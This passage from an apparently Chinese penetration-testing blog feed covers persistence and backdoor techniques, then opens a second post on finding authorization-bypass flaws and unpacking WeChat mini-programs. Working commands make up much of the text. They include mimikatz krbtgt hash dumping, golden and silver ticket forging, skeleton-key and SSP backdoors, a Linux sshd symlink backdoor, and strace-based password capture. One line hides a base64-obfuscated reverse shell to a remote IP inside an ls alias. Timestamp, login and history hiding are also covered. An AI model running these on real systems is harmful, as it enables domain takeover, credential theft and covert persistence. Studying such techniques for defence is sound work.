高速缓存文件夹.&#123;88C6C381-2E85-11D0-94DE-444553540000&#125;mail.&#123;9E56BE60-C50F-11CF-9A2C-00A0C90A90CE&#125;历史记录.&#123;FF393560-C2A7-11CF-BFF4-444553540000&#125;目录.&#123;fe1290f0-cfbd-11cf-a330-00aa00c16e65&#125;Internet Explorer.&#123;FBF23B42-E3F0-101B-8488-00AA003E56F8&#125;Snapshot File.&#123;FACB5ED2-7F99-11D0-ADE2-00A0C90DC8D9&#125;预订文件夹.&#123;F5175861-2688-11d0-9C5E-00AA00A45957&#125;MyDocs Drop Target.&#123;ECF03A32-103D-11d2-854D-006008059367&#125;Policy Package.&#123;ecabaebd-7f19-11d2-978E-0000f8757e2a&#125;搜索结果.&#123;e17d4fc0-5564-11d1-83f2-00a0c90dc849&#125;添加网上邻居.&#123;D4480A50-BA28-11d1-8E75-00C04FA31A86&#125;Paint.&#123;D3E34B21-9D75-101A-8C3D-00AA001A1652&#125;管理工具.&#123;D20EA4E1-3957-11d2-A40B-0C5020524153&#125;字体.&#123;D20EA4E1-3957-11d2-A40B-0C5020524152&#125;Web Folders.&#123;BDEADF00-C265-11d0-BCED-00A0C90AB50F&#125;DocFind Command.&#123;B005E690-678D-11d1-B758-00A0C90564FE&#125;脱机文件夹.&#123;AFDB1F70-2A4C-11d2-9039-00C04F8EEB3E&#125;打印机.&#123;2227A280-3AEA-1069-A2DE-08002B30309D&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明：其他手法还有畸形文件夹、保留文件名无法删除和利用 Easy File Locker 实现驱动级文件隐藏等等，或者直接起一个看起来名称很像的文件，比如 Index.php 和 lndex.php，这里其中一个是大写的 i，一个是小写的 L</p><h1 id="域后门"><a href="#域后门" class="headerlink" title="域后门"></a>域后门</h1><h2 id="1、黄金票据"><a href="#1、黄金票据" class="headerlink" title="1、黄金票据"></a>1、黄金票据</h2><p>说明：通过黄金票据可以实现域内任意用户的伪造，因此即使目标域管理员的密码被修改了，通过黄金票据还是能够获取到对方的权限</p><p>在生成黄金票据前，需要先获取以下信息：</p><ul><li>krbtgt 的 NTLM Hash 或 AES-256 值</li><li>伪造的域管理员用户名</li><li>完整的域名</li><li>域 SID</li></ul><blockquote><p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</p></blockquote><p>操作流程：</p><ol><li>使用 mimikatz 在域控上获取 krbtgt 用户的 NTLM HASH</li></ol><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995893-285294-image.png" alt="img"></p><p>从图中可以看到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087，SID 为 S-1-5-21-284927032-1122706408-2778656994。此时已知域名为 teamssix.com，那么这时所需要的信息就全了。接着来到一台普通域用户权限的主机下，查看 \dc\c$ 发现时拒绝访问的</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029234249010.png" alt="image-20231029234249010"></p><ol start="2"><li>制作黄金票据</li></ol><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995946-803021-image.png" alt="img"></p><ol start="3"><li>使用 mimikatz 进行票据传递</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029234312908.png" alt="image-20231029234312908"></p><p>再次查看 \dc\c$ 发现时就有权限了</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995960-720803-image.png" alt="img"></p><p>PsExec 也同样可以</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029161651010.png" alt="image-20231029161651010"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995968-949523-image.png" alt="img"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029162219603.png" alt="image-20231029162219603"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029162836729.png" alt="image-20231029162836729"></p><h2 id="2、白银票据"><a href="#2、白银票据" class="headerlink" title="2、白银票据"></a>2、白银票据</h2><p>白银票据和黄金票据的区别如下：</p><ol><li>白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志，因此白银票据更加隐蔽。</li><li>白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，所以白银票据的权限就远不如黄金票据的权限了。</li></ol><p>想利用白银票据需要先具备以下信息：</p><ul><li>域名</li><li>域 SID</li><li>目标服务器的 FQDN 即完整的域名</li><li>可利用的服务</li><li>服务账户的 NTLM 哈希</li><li>伪造的用户名即任意用户名</li></ul><p>下面以伪造 CIFS 服务的权限为例：</p><ol><li>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</li></ol><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029164442629.png" alt="image-20231029164442629"></p><p>补充：用户名末尾的$符</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029170542160.png" alt="image-20231029170542160"></p><ol start="2"><li>利用获取到的 Hash 生成白银票据</li></ol><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995979-523341-image.png" alt="img"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029171030803.png" alt="image-20231029171030803"></p><ol start="3"><li>伪造票据后，使用 dir 命令就能获取到目标的 CIFS 服务权限了，除了 CIFS 服务外，还可以伪造 LDAP 等等服务</li></ol><h2 id="3、SSP权限维持"><a href="#3、SSP权限维持" class="headerlink" title="3、SSP权限维持"></a>3、SSP权限维持</h2><p>说明：通过 SSP 权限维持，用户在登录时，密码将会以明文的形式保存在 C:\Windows\System32\mimilsa.log 下。使用 mimikatz 将伪造的 SSP 注入内存，但如果域控重启，被注入内存的伪造 SSP 就会丢失。</p><pre class="line-numbers language-none"><code class="language-none">#在Mimikatz中执行privilege::debugmisc::memssp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105213575.png" alt="image-20231030105213575"></p><p>注销当前用户，输入用户名密码后重新登录，就可以获取到明文密码了</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996014-193247-image.png" alt="img"></p><p>也可以使用 mimikatz 中的 mimilib.dll 文件进行 SSP 权限维持，这种方法重启后不会失效。</p><h2 id="4、SID-History后门"><a href="#4、SID-History后门" class="headerlink" title="4、SID History后门"></a>4、SID History后门</h2><p>说明：每个用户都有自己的安全标识符即 SID，SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。</p><p>操作手法：</p><ol><li>这里使用 mimikatz 将管理员的 SID 添加到普通用户的 SID History 中</li></ol><pre class="line-numbers language-none"><code class="language-none">privilege::debugsid::patchsid::add &#x2F;sam:test &#x2F;new:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996022-70539-image.png" alt="img"></p><ol start="2"><li>使用 test 用户登录，可以看到已经拥有了管理员权限</li></ol><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-24/1642996033-818900-image.png" alt="img" style="zoom:200%;"><h2 id="5、万能密码"><a href="#5、万能密码" class="headerlink" title="5、万能密码"></a>5、万能密码</h2><p>说明：在域管权限下，使用 mimikatz 即可</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996044-182676-image.png" alt="img"></p><p>此时，就可以在域内以任意用户的身份利用 mimikatz 密码进行登录了</p><pre class="line-numbers language-none"><code class="language-none">net use \\dc\ipc$ &quot;mimikatz&quot; &#x2F;user:teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029173359750.png" alt="image-20231029173359750"></p><p>IPC$共享是Windows系统中的一个特殊隐藏共享，用于进程间通信。通过建立与IPC$共享的连接，可以与远程计算机进行某些操作，例如执行命令、访问共享文件夹等。</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996053-90546-image.png" alt="img"></p><p>除了上面的方法外，还可以使用 DSRM 账号进行权限维持，也可以使用 Hook PasswordChangeNotify 脚本查看目标用户修改后的新密码。</p><h1 id="Linux主机后门"><a href="#Linux主机后门" class="headerlink" title="Linux主机后门"></a>Linux主机后门</h1><h2 id="1、添加用户"><a href="#1、添加用户" class="headerlink" title="1、添加用户"></a>1、添加用户</h2><pre class="line-numbers language-none"><code class="language-none">#一句话添加用户（test:123456）useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test#或者使用openssluseradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、SUID-Shell"><a href="#2、SUID-Shell" class="headerlink" title="2、SUID Shell"></a>2、SUID Shell</h2><p>说明：SUID Shell是一种可用于以拥有者权限运行的shell</p><pre class="line-numbers language-none"><code class="language-none">#以root用户权限执行下面的命令cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shellchmod u+s &#x2F;tmp&#x2F;shell#在使用普通用户权限的时候，执行以下命令就能获取root权限&#x2F;tmp&#x2F;shell -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996062-570634-image.png" alt="img"></p><h2 id="3、软链接"><a href="#3、软链接" class="headerlink" title="3、软链接"></a>3、软链接</h2><p>说明：软链接的利用前提是 ssh 配置中开启了 PAM 进行身份验证</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029193747195.png" alt="image-20231029193747195"></p><pre class="line-numbers language-none"><code class="language-none">#使用以下命令查看是否配置PAM认证cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep UsePAM#在目标主机上创建一句话后门ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8888#然后直接ssh root@IP -p 8888，输入任意密码，就可以登录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105239917.png" alt="image-20231030105239917"></p><h2 id="4、strace后门-或称alias-后门"><a href="#4、strace后门-或称alias-后门" class="headerlink" title="4、strace后门(或称alias 后门)"></a>4、strace后门(或称alias 后门)</h2><p>alias命令介绍：</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029200325656.png" alt="image-20231029200325656"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029200428340.png" alt="image-20231029200428340"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105401109.png" alt="image-20231030105401109"></p><p>strace命令介绍：</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195323749.png" alt="image-20231029195323749"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195352272.png" alt="image-20231029195352272"></p><p>利用方式：</p><pre class="line-numbers language-none"><code class="language-none">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时当用户使用 ssh 连接其他主机时，在 &#x2F;tmp&#x2F;.ssh.log 下就能看到连接的密码、操作了，只是显示的不是很直观，如下</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105433940.png" alt="image-20231030105433940"></p><p>另一种利用方式</p><pre class="line-numbers language-none"><code class="language-none">alias ls&#x3D;&#39;alerts()&#123; ls $* --color&#x3D;auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#39;\&#39;&#39;UTF-8&#39;\&#39;&#39;)&#125;[sys.version_info[0]](&#39;\&#39;&#39;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4yNDEuMTI4IiwgNjY2NikpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDIpCiAgICAgICAgcCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGl0KCk&#x3D;&#39;\&#39;&#39;)))&quot;;&#125;;alerts&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的 base64 解码后为以下内容</p><pre class="line-numbers language-none"><code class="language-none">import os,socket,subprocess;ret &#x3D; os.fork()if ret &gt; 0:    exit()else:    try:        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((&quot;192.168.241.128&quot;, 6666))        os.dup2(s.fileno(), 0)        os.dup2(s.fileno(), 1)        os.dup2(s.fileno(), 2)        p &#x3D; subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-i&quot;])    except Exception as e:        exit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样当用户使用 ls 命令时，就会反弹 shell 回来了，当然除了反弹 shell 还可以做很多的其他操作</p><h2 id="5、使用screen命令后台运行"><a href="#5、使用screen命令后台运行" class="headerlink" title="5、使用screen命令后台运行"></a>5、使用screen命令后台运行</h2><p>说明：利用screen命令让命令在后台运行实现权限维持</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211243551.png" alt="image-20231029211243551"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211419320.png" alt="image-20231029211419320"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211428846.png" alt="image-20231029211428846"></p><pre class="line-numbers language-none"><code class="language-none">#发现screen#查看进程寻找ps -aux | grep screen#或者 screen -ls 可以看到当前是否有 screen 在后台运行#使用screen建立新的终端screen -S screenname#Ctrl+a+d(Mac 是 control+a+d)退出 screen 并使命令在后台运行#screen -r screenname 进入刚才的终端<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>除此之外，还有比较常见的定时任务、SSH 公钥登录以及 SSH warpper、openssh 后门、PAM 后门、rootkit 后门等等</p></blockquote><h1 id="Linux文件隐藏"><a href="#Linux文件隐藏" class="headerlink" title="Linux文件隐藏"></a>Linux文件隐藏</h1><h2 id="1、隐藏文件时间戳"><a href="#1、隐藏文件时间戳" class="headerlink" title="1、隐藏文件时间戳"></a>1、隐藏文件时间戳</h2><pre class="line-numbers language-none"><code class="language-none">#复制其他文件的时间touch -r teamssix.txt evil.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195215049.png" alt="image-20231029195215049"></p><pre class="line-numbers language-none"><code class="language-none">#自定义文件的时间，这里演示将时间改为 2022 年的 1 月 1 日 1 时 1 分 1 秒touch -t 202201010101.01 evil.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105452885.png" alt="image-20231030105452885"></p><h2 id="2、隐身登录"><a href="#2、隐身登录" class="headerlink" title="2、隐身登录"></a>2、隐身登录</h2><p>说明：隐身登录系统，不会被 w、who、last 检测到</p><p>w命令介绍：</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204745282.png" alt="image-20231029204745282"></p><pre class="line-numbers language-none"><code class="language-none">#显示当前登录用户的信息w#显示短格式的用户信息w -s#显示用户的空闲时间w -u#显示用户的登录IP地址w -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204956273.png" alt="image-20231029204956273"></p><p>last命令介绍：</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204346797.png" alt="image-20231029204346797"></p><pre class="line-numbers language-none"><code class="language-none">#显示最近的登录记录last#显示特定用户的登录记录last username#显示最近的10条登录记录last -n 10#显示登录IP地址last -i#显示指定时间范围内的登录记录last --since &quot;2023-10-01&quot; --until &quot;2023-10-15&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>隐身登录手法：</p><pre class="line-numbers language-none"><code class="language-none">#一般隐身登录ssh -T root@host &#x2F;bin&#x2F;bash -i#隐身登录系统，同时不保存公钥在本地的 .ssh 目录中ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash –i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、锁定文件"><a href="#3、锁定文件" class="headerlink" title="3、锁定文件"></a>3、锁定文件</h2><p>说明：当文件被锁定时，是无法删除的</p><pre class="line-numbers language-none"><code class="language-none">#锁定文件chattr +i evil.txt#属性查看lsattr  evil.txt#解除锁定chattr -i evil.txt#删除文件rm -rf 1.evil.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030094648542.png" alt="image-20231030094648542"></p><h2 id="4、隐藏历史操作记录"><a href="#4、隐藏历史操作记录" class="headerlink" title="4、隐藏历史操作记录"></a>4、隐藏历史操作记录</h2><pre class="line-numbers language-none"><code class="language-none">#临时禁用历史命令记录功能（注意在 set 命令前有一个空格） set +o history#如果想某条命令不记录到 history 中，直接在命令前加上空格就行，如 ls、 pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030094351564.png" alt="image-20231030094351564"></p><pre class="line-numbers language-none"><code class="language-none">#或者使用grep过滤出history中要删除的文件行，再 -d 指定行即可删除，比如第11行记录history | grep &quot;key&quot;history -d 11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>除此之外，还有在文件前加上 . 实现隐藏文件以及端口复用、进程隐藏等等方法。</p></blockquote><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul><li><a href="https://zone.huoxian.cn/d/860/2">https://zone.huoxian.cn/d/860/2</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>越权漏洞测试手法与技巧</title>
      <link href="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/"/>
      <url>/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="猜测接口找到越权漏洞"><a href="#猜测接口找到越权漏洞" class="headerlink" title="猜测接口找到越权漏洞"></a>猜测接口找到越权漏洞</h1><ol><li><p>使用f12开发者工具，寻找js文件，里面一般会有一些接口，形如：api&#x2F;模块名、api&#x2F;v1&#x2F;模块名、域名&#x2F;api&#x2F;模块名、域名&#x2F;api&#x2F;v1&#x2F;模块名【在找 js 文件的时候，可以关注下有没有以 runtime 命名的 js 文件，因为在这种 js 文件中会包含其他 js 文件的名称（包括当前页面没有加载的 js 文件），这样利用 runtime js 文件就发现了更多的 js 文件，使得找到 api 接口的概率又大了些】</p></li><li><p>尝试访问接口，直接在浏览器输入接口网址即可</p></li><li><p>判断一下该接口的作用(添加？删除？修改？查询？)，以确定下一步的构造【比如，某个js文件中只有查询的接口，那么接下来可以尝试一下构造添加、修改和删除接口】<img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231027141911393.png" alt="image-20231027141911393"></p></li><li><p>尝试构造接口，下面是一些后台模块常见的接口格式</p><p>添加接口</p><ul><li>POST&#x2F;PUT &#x2F;api&#x2F;模块名</li><li>POST &#x2F;api&#x2F;模块名&#x2F;add</li></ul><p>删除接口</p><ul><li>DELETE &#x2F;api&#x2F;模块名&#x2F;id</li><li>GET &#x2F;api&#x2F;模块名&#x2F;del?id&#x3D;</li><li>POST &#x2F;api&#x2F;模块名&#x2F;</li></ul><p>修改接口</p><ul><li>POST &#x2F;api&#x2F;模块名&#x2F;modify</li><li>POST &#x2F;api&#x2F;模块名&#x2F;</li></ul><p>查询接口</p><ul><li>GET &#x2F;api&#x2F;模块名&#x2F;list</li><li>GET &#x2F;api&#x2F;模块名&#x2F;all</li></ul><p>其他说明</p><ul><li>POST发包的值常为{}，即{“键1”:”值”,”键2”:”值”}</li></ul></li></ol><h1 id="微信小程序接口未授权"><a href="#微信小程序接口未授权" class="headerlink" title="微信小程序接口未授权"></a>微信小程序接口未授权</h1><h2 id="微信小程序解包"><a href="#微信小程序解包" class="headerlink" title="微信小程序解包"></a>微信小程序解包</h2><p>微信小程序解包介绍：微信小程序解包是指将微信小程序的源代码从其原始的.wxapkg文件中提取出来，以便进行分析、修改或反编译。一些开发者可能会使用这种技术来了解小程序的内部工作原理，或者为了进行安全审计。请注意，微信小程序的反编译和解包操作可能会违反微信的服务条款</p><p>.wxapkg文件介绍：.wxapkg文件是微信小程序的打包文件格式(所以又称微信小程序包、微信小程序源码包)，它是一种压缩文件，通常包含了一个或多个小程序的代码、资源和配置信息等。可以将.wxapkg文件解压缩成一个目录结构，其中包含了小程序的所有文件和文件夹，例如JavaScript、CSS、图片、音频、视频、配置文件等【微信小程序在运行时，会在用户系统中生成一个后缀为wxapkg的程序包，通过反编译这个包，我们便可以获取到此小程序的前端代码，通过分析前端代码，可以得到后端接口与传输数据】</p><p>操作手法：想要对微信小程序进行解包操作，首先是要获取目标小程序的wxapkg文件。wxapkg文件是微信小程序的安装包文件格式，用于将小程序的代码、资源以及其他必要的文件打包成一个单独的文件。但是Windows环境下的wxapkg文件中的js代码和资源文件一般是被加密的，需要使用专门设计的解密工具先进行解密，再进行解包操作，获取文件内容。iOS和Android平台下可直接进行解包操作</p><ol><li><p>获取.wxapkg文件(Windows版和手机版的微信小程序包稍微有点区别，下面以Windows版为例)</p><ul><li>Windows .wxapkg 文件默认存放路径：<code>C:\Users\&#123;系统用户名&#125;\Documents\WeChat Files\Applet\&#123;小程序的AppID&#125;\</code></li><li>IOS .wxapkg 文件默认存放路径：<code>/var/mobile/Containers/Data/Application/&#123;系统UUID&#125;/Library/WechatPrivate/&#123;user哈希值&#125;/WeApp/LocalCache/release/&#123;小程序的AppID&#125;</code></li><li>Android .wxapkg 默认文件存放路径：<code>/data/data/com.tencent.mm/MicroMsg/&#123;user哈希值&#125;/appbrand/pkg/</code></li></ul><p>说明：以上是默认存放路径，如果更改过微信文件保存路径，可以在微信设置中查看</p><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030150424988.png" alt="image-20231030150424988"></p><p>目录展示：目录下有一堆wx开头的目录，后面的一串字符就是对应的小程序ID【可以在访问小程序时通过抓包获取到。如果不想抓包又想知道小程序ID，有个技巧，可以把这些目录删掉，重新访问小程序时会再次自动下载，根据日期来找到对应的包即可】<img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030145000259.png" alt="image-20231030145000259"></p></li><li><p>Windows版的小程序包自动在外部加了一层的加密(所以才需要解密，只有解密了才能解包)，我们看到的包名统一为：_<em>APP</em>_.wxapkg</p></li></ol><p><img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231030145549897.png" 